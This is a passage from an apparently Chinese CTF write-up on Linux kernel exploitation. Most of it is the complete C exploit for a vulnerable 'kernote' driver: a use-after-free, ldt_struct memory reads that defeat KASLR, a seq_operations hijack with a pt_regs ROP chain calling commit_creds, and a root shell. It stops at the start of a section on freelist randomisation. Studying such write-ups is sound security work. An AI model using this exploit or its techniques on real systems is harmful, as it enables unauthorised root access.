+<p>具体参考：<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x04-pt-regs-%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3">https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x04-pt-regs-%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3</a></p>
+<h3 id="完整-EXP"><a href="#完整-EXP" class="headerlink" title="完整 EXP"></a>完整 EXP</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// gcc -masm=intel -pthread -static -o exp exp.c</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;errno.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;poll.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;poll.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;asm/ldt.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/prctl.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span>
+
+<span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[31m\033[1m[x] Error at: \033[0m%s\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span> user_ss<span class="token punctuation">,</span> user_rflags<span class="token punctuation">,</span> user_sp<span class="token punctuation">;</span>
+<span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token function">__asm__</span><span class="token punctuation">(</span><span class="token string">"mov user_cs, cs;"</span>
+            <span class="token string">"mov user_ss, ss;"</span>
+            <span class="token string">"mov user_sp, rsp;"</span>
+            <span class="token string">"pushf;"</span>
+            <span class="token string">"pop user_rflags;"</span>
+            <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[34m\033[1m[*] Status has been saved.\033[0m\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token class-name">size_t</span> commit_creds <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> prepare_kernel_cred <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+<span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>   
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[32m\033[1m[+] Backing from the kernelspace.\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[31m\033[1m[x] Failed to get the root!\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// to exit the process normally instead of segmentation fault</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NOTE_DELETE</span> <span class="token expression"><span class="token number">0x6668</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NOTE_SELECT</span> <span class="token expression"><span class="token number">0x6666</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NOTE_ADD</span> <span class="token expression"><span class="token number">0x6667</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NOTE_EDIT</span> <span class="token expression"><span class="token number">0x6669</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NOTE_NOUSE</span> <span class="token expression"><span class="token number">0x666A</span></span></span>
+
+
+<span class="token keyword">int</span> fd<span class="token punctuation">;</span>
+<span class="token keyword">int</span> seq_fd<span class="token punctuation">;</span>
+<span class="token keyword">int</span> pid<span class="token punctuation">;</span>
+<span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span>
+<span class="token class-name">uint64_t</span> page_offset_base <span class="token operator">=</span> <span class="token number">0xffff888000000000uLL</span><span class="token punctuation">;</span>
+<span class="token class-name">uint64_t</span> kernel_base<span class="token punctuation">,</span> kernel_offset<span class="token punctuation">;</span>
+<span class="token class-name">uint64_t</span> pop_rdi_ret<span class="token punctuation">,</span> swapgs_restore_regs_and_return_to_usermode<span class="token punctuation">,</span> init_cred<span class="token punctuation">;</span>
+
+<span class="token keyword">void</span> <span class="token function">safe_read</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> addr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_EDIT<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"fork error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// child</span>
+        <span class="token function">syscall</span><span class="token punctuation">(</span>SYS_modify_ldt<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">struct</span> <span class="token class-name">user_desc</span> desc<span class="token punctuation">;</span>
+    <span class="token class-name">uint64_t</span> tmp<span class="token punctuation">;</span>
+    <span class="token class-name">uint64_t</span> search_addr<span class="token punctuation">;</span>
+    <span class="token class-name">uint64_t</span> files_addr<span class="token punctuation">;</span>
+    <span class="token class-name">uint64_t</span> file0_addr<span class="token punctuation">;</span>
+    <span class="token class-name">uint64_t</span> f_op_addr<span class="token punctuation">;</span>
+    <span class="token class-name">uint64_t</span> <span class="token operator">*</span>comm_addr<span class="token punctuation">;</span>
+    <span class="token keyword">int</span> cur_pid<span class="token punctuation">;</span>
+
+    <span class="token class-name">cpu_set_t</span> cpu_mask<span class="token punctuation">;</span>
+    <span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cpu_mask<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">CPU_SET</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_mask<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_mask<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span> MAP_SHARED <span class="token operator">|</span> MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>buf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"mmap error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/kernote"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"open device"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"creating UAF..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>desc<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    desc<span class="token punctuation">.</span>base_addr<span class="token operator">=</span><span class="token number">0xff0000</span><span class="token punctuation">;</span>
+    desc<span class="token punctuation">.</span>entry_number<span class="token operator">=</span><span class="token number">0x8000</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">;</span>
+
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_ADD<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_SELECT<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_DELETE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">syscall</span><span class="token punctuation">(</span>SYS_modify_ldt<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>desc<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// new ldt_struct</span>
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"searching page_offset_base..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_EDIT<span class="token punctuation">,</span> page_offset_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">syscall</span><span class="token punctuation">(</span>SYS_modify_ldt<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>tmp<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            page_offset_base <span class="token operator">+=</span> <span class="token number">1</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">;</span>  <span class="token comment">// direct mapping size = 1G</span>
+            <span class="token keyword">continue</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"page_offset_base = %#lx\n"</span><span class="token punctuation">,</span> page_offset_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"leaking files..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">prctl</span><span class="token punctuation">(</span>PR_SET_NAME<span class="token punctuation">,</span> <span class="token string">"xi4oyu2333"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    search_addr <span class="token operator">=</span> page_offset_base<span class="token punctuation">;</span>
+    files_addr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    cur_pid <span class="token operator">=</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">safe_read</span><span class="token punctuation">(</span>search_addr<span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        comm_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">memmem</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">,</span> <span class="token string">"xi4oyu2333"</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>comm_addr <span class="token operator">&amp;&amp;</span>
+        comm_addr<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">></span> page_offset_base <span class="token operator">&amp;&amp;</span>
+        comm_addr<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">></span> page_offset_base <span class="token operator">&amp;&amp;</span>
+        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>comm_addr<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">58</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> cur_pid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            files_addr <span class="token operator">=</span> comm_addr<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"found files %#lx\n"</span><span class="token punctuation">,</span> files_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        search_addr <span class="token operator">+=</span> <span class="token number">0x8000</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"leaking files->fd_array[0]..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">safe_read</span><span class="token punctuation">(</span>files_addr<span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    file0_addr <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">160</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>file0_addr <span class="token operator">></span> page_offset_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"file0 addr error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"file0 addr %#lx\n"</span><span class="token punctuation">,</span> file0_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"leaking files->file0->f_op..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">safe_read</span><span class="token punctuation">(</span>file0_addr<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    f_op_addr <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"f_op addr %#lx\n"</span><span class="token punctuation">,</span> f_op_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    kernel_offset <span class="token operator">=</span> f_op_addr <span class="token operator">-</span> <span class="token number">0xffffffff820b5e00</span><span class="token punctuation">;</span>  <span class="token comment">// tty_ops</span>
+    kernel_base <span class="token operator">=</span> <span class="token number">0xffffffff81000000</span> <span class="token operator">+</span> kernel_offset<span class="token punctuation">;</span>
+    commit_creds <span class="token operator">=</span> <span class="token number">0xffffffff810c9dd0</span> <span class="token operator">+</span> kernel_offset<span class="token punctuation">;</span>
+    prepare_kernel_cred <span class="token operator">=</span> <span class="token number">0xffffffff810ca2b0</span> <span class="token operator">+</span>  kernel_offset<span class="token punctuation">;</span>
+    pop_rdi_ret <span class="token operator">=</span> <span class="token number">0xffffffff81075c4c</span> <span class="token operator">+</span> kernel_offset<span class="token punctuation">;</span>
+    swapgs_restore_regs_and_return_to_usermode <span class="token operator">=</span> <span class="token number">0xffffffff81c00fb0</span> <span class="token operator">+</span> kernel_offset <span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">;</span>
+    init_cred <span class="token operator">=</span> <span class="token number">0xffffffff8266b780</span> <span class="token operator">+</span> kernel_offset<span class="token punctuation">;</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"kernel_base = %#lx\n"</span><span class="token punctuation">,</span> kernel_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"kernel_offset = %#lx\n"</span><span class="token punctuation">,</span> kernel_offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"commit_creds = %#lx\n"</span><span class="token punctuation">,</span> commit_creds<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"prepare_kernel_cred = %#lx\n"</span><span class="token punctuation">,</span> prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"creating UAF..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_ADD<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_SELECT<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_DELETE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>seq_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"open stat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_EDIT<span class="token punctuation">,</span> <span class="token number">0xffffffff810b345b</span> <span class="token operator">+</span> kernel_offset<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// add rsp, 0x190 ; pop, pop, pop ; ret</span>
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"hijack seq operation"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// pt_regs rsp offset 0x198</span>
+    <span class="token function">__asm__</span><span class="token punctuation">(</span>
+        <span class="token string">"mov r15,   0xbeefdead;"</span>
+        <span class="token string">"mov r14,   0x11111111;"</span>
+        <span class="token string">"mov r13,   pop_rdi_ret;"</span> 
+        <span class="token string">"mov r12,   init_cred;"</span> <span class="token comment">// start at here</span>
+        <span class="token string">"mov rbp,   commit_creds;"</span>
+        <span class="token string">"mov rbx,   swapgs_restore_regs_and_return_to_usermode;"</span>
+        <span class="token string">"mov r11,   0x66666666;"</span>
+        <span class="token string">"mov r10,   0x77777777;"</span>
+        <span class="token string">"mov r9,    0x88888888;"</span>
+        <span class="token string">"mov r8,    0x99999999;"</span>
+        <span class="token string">"xor rax,   rax;"</span>
+        <span class="token string">"mov rcx,   0xaaaaaaaa;"</span>
+        <span class="token string">"mov rdx,   8;"</span>
+        <span class="token string">"mov rsi,   rsp;"</span>
+        <span class="token string">"mov rdi,   seq_fd;"</span>
+        <span class="token string">"syscall"</span>
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="回到一切开始前"><a href="#回到一切开始前" class="headerlink" title="回到一切开始前"></a>回到一切开始前</h2><p>在 leak 和 劫持 seq_operations 时有一个小细节，就是因为 <strong>SLAB_FREELIST_RANDOM</strong> 的开启，无法预测从 free_list 中分配到 object</p>
+<p>exp 中下面怎么可以确定新分配的 ldt_struct 就一定是刚释放的 object 呢？</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+	<span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_ADD<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_SELECT<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_DELETE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
